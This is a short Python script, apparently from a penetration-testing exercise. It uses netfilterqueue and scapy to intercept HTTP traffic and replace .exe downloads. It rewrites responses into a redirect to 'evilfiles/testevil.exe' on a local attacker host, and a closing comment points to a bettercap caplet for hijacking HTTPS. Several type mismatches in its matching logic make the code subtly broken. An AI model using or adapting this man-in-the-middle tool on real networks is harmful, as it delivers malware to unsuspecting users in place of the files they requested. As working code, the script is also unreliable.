#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

def set_packet(packet, load):
    new_packet = packet
    del new_packet[scapy.IP].len
    del new_packet[scapy.IP].chksum
    del new_packet[scapy.TCP].chksum
    new_packet[scapy.Raw].load = load

    return new_packet

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet:
        try:
            if scapy.TCP in scapy_packet and scapy_packet[scapy.TCP].dport == 8080:  # Outgoing HTTP request
                print("[+] HTTP packet being sent...")
                if b".exe" in scapy_packet[scapy.Raw].load.decode() and b"192.168.119.139" not in scapy_packet[scapy.Raw].load:  # Keep load as bytes
                    print("[+] exe request found...")
                    ack_list.append(str(scapy_packet[scapy.TCP].ack))
            elif scapy.TCP in scapy_packet and  scapy_packet[scapy.TCP].sport == 8080:  # Incoming HTTP response
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file...")
                    modified_packet = set_packet(
                        scapy_packet,
                        b"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/evilfiles/testevil.exe\n\n"
                    )  # Make sure this is bytes
                    packet.set_payload(bytes(modified_packet))  # Convert to bytes
                    print(scapy_packet.show())
            else:
                print(scapy_packet[scapy.Raw].load.decode())
                print("[+] No Packet matches filter... ")
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#to run https: bettercap -iface eth0 -caplet hstshijack/hstshijack
